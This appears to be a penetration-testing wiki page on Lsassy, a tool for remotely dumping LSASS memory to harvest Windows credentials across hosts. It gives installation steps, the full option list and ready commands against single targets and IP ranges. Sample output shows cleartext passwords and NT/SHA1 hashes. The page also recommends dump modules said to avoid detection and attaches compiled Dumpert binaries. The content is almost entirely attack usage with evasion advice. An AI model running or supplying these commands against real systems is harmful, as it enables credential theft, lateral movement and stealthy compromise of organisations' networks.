---
title : "Lsassy"
# pre : ' '
description : "Python library to remotely extract credentials on a set of hosts."
date : 2020-05-15T09:32:35+02:00
# hidden : true
# draft : true
weight : 0
# tags : ['']
---

## Lsassy

Remote LSASS dumper - Python library to remotely extract credentials on a set of hosts.

### Installation

```plain
python3 -m pip install lsassy
```

### Usage

```plain
usage: lsassy [-h] [-m METHOD] [--dumpname DUMPNAME] [--procdump PROCDUMP] [--dumpert DUMPERT] [--threads THREADS] [--timeout TIMEOUT]
              [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [-H HASHES] [-k] [-dc-ip ip address] [-aesKey hex key] [-o OUTFILE]
              [-f {pretty,json,grep,none}] [-r] [-v] [-q] [-V]
              [target [target ...]]
```

### Flags

```plain
lsassy v2.1.3 - Remote lsass dump reader

positional arguments:
  target                The target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets

optional arguments:
  -h, --help            show this help message and exit
  -r, --raw             No basic result filtering (Display host credentials, duplicates and empty pass)
  -v                    Verbosity level (-v or -vv)
  -q, --quiet           Quiet mode, only display credentials
  -V, --version         show program's version number and exit

dump:
  -m METHOD, --method METHOD
                        Dumping method
                            0: Try all methods (dll then procdump then dumpert) to dump lsass, stop on success (Requires -p if dll method fails, -u if procdump method fails)
                            1: comsvcs.dll method, stop on success (default)
                            2: Procdump method, stop on success (Requires -p)
                            3: comsvcs.dll + Powershell method, stop on success
                            4: comsvcs.dll + cmd.exe method
                            5: (unsafe) dumpert method, stop on success (Requires -u)
  --dumpname DUMPNAME   Name given to lsass dump (Default: Random)
  --procdump PROCDUMP   Procdump path
  --dumpert DUMPERT     dumpert path
  --threads THREADS     Threads number
  --timeout TIMEOUT     Timeout before considering lsass was not dumped successfully

authentication:
  -u USERNAME, --username USERNAME
                        Username
  -p PASSWORD, --password PASSWORD
                        Plaintext password
  -d DOMAIN, --domain DOMAIN
                        Domain name
  -H HASHES, --hashes HASHES
                        [LM:]NT hash
  -k, --kerberos        Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

output:
  -o OUTFILE, --outfile OUTFILE
                        Output credentials to file
  -f {pretty,json,grep,none}, --format {pretty,json,grep,none}
                        Output format (Default pretty)

example:
    lsassy -d adsec.local -u pixis -p p4ssw0rd 192.168.1.0/24
```

### Examples

#### Dump lsass from single target

```plain
$ lsassy -d <domain> -u '<domain-admin>or<local-admin>' -p '<password>' <target>

[+] [10.10.10.10] offsec.nl\john.do   Welkom1234
```

#### Dump lsass from range of IP's

```plain
$ lsassy -d <domain> -u '<domain-admin>or<local-admin>' -p '<password>' 10.10.10.10-12

[+] [10.10.10.10] offsec.nl\john.do   Welkom1234
[+] [10.10.10.11] offsec.nl\jane.do   Welk0m4
[+] [10.10.10.12] offsec.nl\el.prof   NietWelkom
```

#### Dump lsass with module

Modules that can be used without prerequisites and from experience are not generally detected:

* comsvcs_stealth
* procdump_embedded
* mirrordump_embedded

##### comsvcs_stealth

```plain
$ lsassy -d offsec.nl -u john.do -p 'Welkom1234' 10.10.10.10 -m comsvcs_stealth
[+] 10.10.10.10 Authentication successful
[+] 10.10.10.10 Comsvcs.dll successfuly copied
[+] 10.10.10.10 Lsass dumped in C:\Windows\Temp\R0fDNwVOq.ttf (215340545 Bytes)
[+] 10.10.10.10 Lsass dump deleted
[+] 10.10.10.10 OFFSEC\adm_johndo           [NT] 80a2cc87940725[...SNIP...]562de29 | [SHA1] c58e8057[...SNIP...]5df5c7d8a10afe5d
[+] 10.10.10.10 OFFSEC\PDC01$    [NT] cb381530[...SNIP...]45ee76 | [SHA1] e16078f9f6939f0[...SNIP...]93156b55db
[+] 10.10.10.10 offsec.nl\PDC01$  [PWD] d52be466975b3728c2acc13d9a7422a7b10[...SNIP...]e0a7795122cb2ee55537
[+] 10.10.10.10 OFFSEC\PDC01$    [NT] 9e333[...SNIP...]9b27607fc | [SHA1] 3b8152bd[...SNIP...]2255e3ea72c
[+] 10.10.10.10 offsec.nl\PDC01$  [PWD] c1e3cebd8f9628c752b34ca1290d8771cb159fedb2298219f7[...SNIP...]28bc2fe4ddc56b0e98a019bb072
```

##### Dumpert

{{%attachments title="Compiled binaries" fa_icon_class="far fa-file" pattern=".*(exe|dll)"/%}}

### URL list

* [GitHub.com - lsassy](https://github.com/Hackndo/lsassy)
* [Github.com - Dumpert](https://github.com/outflanknl/Dumpert)
